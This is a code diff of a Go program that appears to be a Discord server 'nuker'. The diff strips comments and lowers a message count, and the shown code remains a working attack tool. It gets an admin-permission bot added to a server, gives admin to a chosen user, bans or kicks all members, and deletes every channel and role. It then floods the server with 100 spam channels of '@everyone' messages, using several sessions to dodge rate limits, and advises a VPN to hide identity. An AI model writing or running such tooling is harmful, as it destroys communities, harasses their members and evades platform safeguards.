@@ -25,17 +25,14 @@ var (
 	colorMagenta = "\033[35m"
 )
 
-// Print colored text
 func printColored(text string, colorCode string) {
 	fmt.Print(colorCode + text + colorReset)
 }
 
-// Print colored line
 func printColoredLine(text string, colorCode string) {
 	fmt.Println(colorCode + text + colorReset)
 }
 
-// Constants for the banner
 const (
 	banner = `
 
@@ -50,7 +47,6 @@ const (
 `
 )
 
-// List of spam messages
 var spamMessages = []string{
 	"# @everyone @here gg krex was here",
 	"# @everyone @here krexontop",
@@ -58,7 +54,6 @@ var spamMessages = []string{
 	"# @everyone @here krex was here 💀",
 }
 
-// Channel name prefixes (will be combined with random unicode characters)
 var channelPrefixes = []string{
 	"krex-",
 	"krexontop-",
@@ -85,7 +80,7 @@ func init() {
 }
 
 func main() {
-	// Clear screen
+
 	fmt.Print("\033[H\033[2J")
 	fmt.Print("\033[H\033[2J")
 
@@ -95,15 +90,12 @@ func main() {
 	printColoredLine("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀", colorPurple)
 	fmt.Println()
 
-	// Display warning about using VPN to avoid rate limits
+	
 	printColoredLine("⚠️ CAUTION: Use a VPN to avoid Discord rate limits! ⚠️", colorRed)
 	printColoredLine("   Discord may block your IP if you send too many requests.", colorYellow)
 	printColoredLine("   A VPN will help protect your identity and avoid rate limits.", colorYellow)
 	fmt.Println()
 
-	// Remove the confirmation prompt code from here
-
-	// Show the menu directly without proxy loading
 	printColoredLine("[*] Select an option:", colorCyan)
 	printColoredLine("[1] Use Bot Token to Nuke (Auto-detect when added)", colorGreen)
 	printColoredLine("[2] Use Bot Token to Nuke Specific Server", colorGreen)
@@ -135,7 +127,7 @@ func nukeWithToken() {
 	userID, _ := reader.ReadString('\n')
 	userID = strings.TrimSpace(userID)
 
-	// Configure nuke options BEFORE connecting to Discord
+
 	fmt.Println()
 	printColoredLine("[*] Configure nuke options before connecting:", colorCyan)
 	options := configureNukeOptions()
@@ -149,14 +141,12 @@ func nukeWithToken() {
 		return
 	}
 
-	// Get application information to generate invite link
 	app, err := dg.Application("@me")
 	if err != nil {
 		printColoredLine("[!] Error getting application info: "+err.Error(), colorRed)
 		return
 	}
 
-	// Generate bot invite link with admin permissions
 	inviteLink := fmt.Sprintf("https://discord.com/api/oauth2/authorize?client_id=%s&permissions=8&scope=bot", app.ID)
 	fmt.Println()
 	printColoredLine("▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄", colorPurple)
@@ -166,11 +156,11 @@ func nukeWithToken() {
 	fmt.Println()
 	printColoredLine("[*] Waiting for the bot to be added to a server...", colorCyan)
 
-	// Set up handler for guild create events (when bot is added to a server)
+
 	dg.AddHandler(func(s *discordgo.Session, gc *discordgo.GuildCreate) {
 		printColoredLine("[+] Bot added to new server: "+gc.Name+" (ID: "+gc.ID+")", colorGreen)
 		printColoredLine("[*] Starting nuking process for: "+gc.Name, colorCyan)
-		// Pass the pre-configured options to nukeServerWithOptions
+
 		nukeServerWithOptions(dg, gc.ID, userID, options)
 		printColoredLine("[+] Server "+gc.Name+" has been nuked!", colorGreen)
 	})
@@ -201,7 +191,7 @@ func nukeSpecificServer() {
 	userID, _ := reader.ReadString('\n')
 	userID = strings.TrimSpace(userID)
 
-	// Configure nuke options BEFORE connecting to Discord
+
 	fmt.Println()
 	printColoredLine("[*] Configure nuke options before connecting:", colorCyan)
 	options := configureNukeOptions()
@@ -214,7 +204,7 @@ func nukeSpecificServer() {
 		return
 	}
 
-	// Create a channel to signal when ready handler completes
+
 	readyComplete := make(chan bool, 1)
 
 	dg.AddHandler(func(s *discordgo.Session, ready *discordgo.Ready) {
@@ -230,7 +220,6 @@ func nukeSpecificServer() {
 		fmt.Println()
 		printColored("[>] Enter the number of the server to nuke: ", colorCyan)
 
-		// Use a new reader instance for the handler
 		handlerReader := bufio.NewReader(os.Stdin)
 		numStr, _ := handlerReader.ReadString('\n')
 		numStr = strings.TrimSpace(numStr)
@@ -247,7 +236,7 @@ func nukeSpecificServer() {
 		guildName := ready.Guilds[num-1].Name
 		printColoredLine(fmt.Sprintf("[*] Starting nuke process for server: %s", guildName), colorCyan)
 
-		// Start nuking in a separate goroutine to avoid blocking
+
 		go func() {
 			nukeServerWithOptions(dg, guildID, userID, options)
 			printColoredLine("[+] Server "+guildName+" has been nuked!", colorGreen)
@@ -261,7 +250,7 @@ func nukeSpecificServer() {
 		return
 	}
 
-	// Wait for the ready handler to complete or timeout
+
 	select {
 	case success := <-readyComplete:
 		if success {
@@ -277,12 +266,12 @@ func nukeSpecificServer() {
 	dg.Close()
 }
 
-// nukeServerWithOptions nukes a server with pre-configured options
+
 func nukeServerWithOptions(s *discordgo.Session, guildID, userID string, options NukeOptions) {
-	// Try to give admin role to the specified user
+
 	go giveAdminToUser(s, guildID, userID)
 
-	// Process members according to options
+	
 	if options.BanAll {
 		go BanAllMembers(s, guildID, options)
 	} else if options.KickAll {
@@ -291,19 +280,17 @@ func nukeServerWithOptions(s *discordgo.Session, guildID, userID string, options
 		go DmAllMembers(s, guildID, options.DmMsg)
 	}
 
-	// Start channel deletion in background
+
 	go deleteAllChannels(s, guildID)
 
-	// Start role deletion in background
+
 	go deleteAllRoles(s, guildID)
 
-	// Start creating spam channels immediately without waiting
-	// Wait just a tiny moment to ensure the session is ready
 	time.Sleep(100 * time.Millisecond)
 	createSpamChannels(s, guildID)
 }
 
-// configureNukeOptions gets nuke options from user input
+
 func configureNukeOptions() NukeOptions {
 	options := DefaultNukeOptions
 
@@ -338,7 +325,7 @@ func configureNukeOptions() NukeOptions {
 		}
 	}
 
-	// Show summary of selected options
+
 	fmt.Println()
 	printColoredLine("[*] Nuke configuration:", colorCyan)
 	if options.BanAll {
@@ -376,7 +363,7 @@ func giveAdminToUser(s *discordgo.Session, guildID, userID string) {
 		return
 	}
 
-	// Assign the role to the user
+
 	err = s.GuildMemberRoleAdd(guildID, userID, adminRole.ID)
 	if err != nil {
 		printColoredLine("[!] Error assigning admin role to user: "+err.Error(), colorRed)
@@ -407,7 +394,7 @@ func deleteAllChannels(s *discordgo.Session, guildID string) {
 			} else {
 				printColoredLine("[+] Deleted channel: "+channelName, colorGreen)
 			}
-			time.Sleep(250 * time.Millisecond) // 0.25 seconds between deletions
+			time.Sleep(250 * time.Millisecond)
 		}(channel.ID, channel.Name)
 	}
 
@@ -450,17 +437,15 @@ func deleteAllRoles(s *discordgo.Session, guildID string) {
 }
 
 func createSpamChannels(s *discordgo.Session, guildID string) {
-	numChannels := 100 // Increased number of spam channels to create
+	numChannels := 100 
 	printColoredLine(fmt.Sprintf("[*] Creating %d spam channels...", numChannels), colorCyan)
 
-	// Prepare multiple sessions to bypass rate limits
+
 	const numSessions = 5
 	sessions := make([]*discordgo.Session, numSessions)
 
-	// Get bot token from existing session
 	botToken := strings.TrimPrefix(s.Token, "Bot ")
 
-	// Create multiple sessions
 	for i := 0; i < numSessions; i++ {
 		sess, err := discordgo.New("Bot " + botToken)
 		if err != nil {
@@ -476,7 +461,6 @@ func createSpamChannels(s *discordgo.Session, guildID string) {
 		defer sess.Close()
 	}
 
-	// Create multiple channels in parallel with multiple sessions
 	var wg sync.WaitGroup
 	wg.Add(numChannels)
 
@@ -489,18 +473,17 @@ func createSpamChannels(s *discordgo.Session, guildID string) {
 		start := sessionIdx * channelsPerSession
 		end := start + channelsPerSession
 		if sessionIdx == numSessions-1 {
-			end = numChannels // Make sure the last session handles all remaining channels
+			end = numChannels
 		}
 
 		for i := start; i < end; i++ {
 			go func(session *discordgo.Session) {
 				defer wg.Done()
 
-				// Create channel with random name
 				channelName := generateRandomChannelName()
 				channel, err := session.GuildChannelCreate(guildID, channelName, discordgo.ChannelTypeGuildText)
 				if err != nil {
-					// Try once more with the main session if failed
+
 					channel, err = s.GuildChannelCreate(guildID, channelName, discordgo.ChannelTypeGuildText)
 					if err != nil {
 						printColoredLine("[!] Error creating channel: "+err.Error(), colorRed)
@@ -510,15 +493,13 @@ func createSpamChannels(s *discordgo.Session, guildID string) {
 
 				printColoredLine("[+] Created channel: "+channelName, colorGreen)
 
-				// Spam messages in the channel - use multiple goroutines for faster messaging
-				const messagesPerChannel = 5000 // Increased message count
-				const concurrentSenders = 50    // More concurrent senders
+				const messagesPerChannel = 250
+				const concurrentSenders = 50
 				const messagesPerSender = messagesPerChannel / concurrentSenders
 
 				var spamWg sync.WaitGroup
 				spamWg.Add(concurrentSenders)
 
-				// Pre-generate some random messages to avoid generating them for every message
 				randomMessages := make([]string, 10)
 				for i := range randomMessages {
 					randomMessages[i] = getRandomSpamMessage()
@@ -528,21 +509,18 @@ func createSpamChannels(s *discordgo.Session, guildID string) {
 					go func(chanID string, senderID int) {
 						defer spamWg.Done()
 
-						// Send messages in batches to avoid too many API calls
 						for k := 0; k < messagesPerSender; k++ {
 							msgIndex := k % len(randomMessages)
 							_, err := session.ChannelMessageSend(chanID, randomMessages[msgIndex])
 							if err != nil {
-								// If error, try with main session
+
 								s.ChannelMessageSend(chanID, randomMessages[msgIndex])
-								// No sleep to make it as fast as possible
+
 							}
 						}
 					}(channel.ID, j)
 				}
 
-				// Don't wait for messages to complete, continue creating channels
-				// This makes the process much faster
 				go func() {
 					spamWg.Wait()
 				}()
@@ -550,37 +528,36 @@ func createSpamChannels(s *discordgo.Session, guildID string) {
 		}
 	}
 
-	// Wait for all channels to be created
 	wg.Wait()
 	printColoredLine("[+] Finished creating spam channels and initiated message flooding", colorGreen)
 }
 
-// Get a random spam message from the list
+
 func getRandomSpamMessage() string {
 	return spamMessages[rand.Intn(len(spamMessages))]
 }
 
-// Generate a channel name with a prefix plus random unicode characters
+
 func generateRandomChannelName() string {
-	// Select a random prefix
+
 	prefix := channelPrefixes[rand.Intn(len(channelPrefixes))]
 
-	// Generate random Unicode chars for the second part
-	unicodePart := generateRandomUnicode(5 + rand.Intn(5)) // 5-10 chars
+
+	unicodePart := generateRandomUnicode(5 + rand.Intn(5)) 
 
 	return prefix + unicodePart
 }
 
-// Generate random unicode characters
+
 func generateRandomUnicode(length int) string {
 	result := ""
 
 	for i := 0; i < length; i++ {
-		// Select a random unicode range
+
 		rangeIdx := rand.Intn(len(unicodeRanges))
 		selectedRange := unicodeRanges[rangeIdx]
 
-		// Generate a character within that range
+
 		charCode := rand.Intn(selectedRange[1]-selectedRange[0]) + selectedRange[0]
 		result += string(rune(charCode))
 	}
